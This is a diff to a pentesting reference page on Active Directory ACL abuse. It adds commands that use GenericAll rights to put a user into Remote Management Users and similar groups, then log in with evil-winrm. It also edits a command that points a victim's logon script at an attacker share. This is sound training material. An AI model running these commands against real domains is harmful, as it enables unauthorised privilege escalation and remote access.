@@ -42,6 +42,31 @@ Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
 
+### Escalate remote access via privileged local groups
+
+GenericAll over built-in local groups that gate remote access lets you pivot without full DA. Common targets:
+
+- Remote Management Users → WinRM access (5985/5986)
+- Remote Desktop Users → RDP logon
+- Administrators → Full local admin on the target(s)
+
+Examples:
+
+```bash
+# Windows PowerShell
+Add-ADGroupMember -Identity "Remote Management Users" -Members spotless -Verbose
+
+# Linux (BloodyAD)
+python3 bloodyAD.py -d FABRIKAM.LOCAL -u bob -p 'P@ssw0rd!' \
+  add groupMember 'CN=Remote Management Users,CN=Builtin,DC=fabrikam,DC=local' bob
+```
+
+Note: Built-in local groups live under `CN=Builtin,DC=...`. After adding yourself, try WinRM:
+
+```bash
+evil-winrm -i <host> -u FABRIKAM\\bob -p 'P@ssw0rd!'
+```
+
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
 Holding these privileges on a computer object or a user account allows for:
@@ -106,7 +131,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 This permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script.
 
 ```bash
-Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
+Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\\totallyLegitScript.ps1"
 ```
 
 ## **GenericWrite on Group**
@@ -206,8 +231,8 @@ Furthermore, additional methods for executing code or maintaining persistence, s
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 - [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
-- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [HTB: Sweep — Lansweeper credential interception and AD ACL abuse to Domain Admin](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
-
-
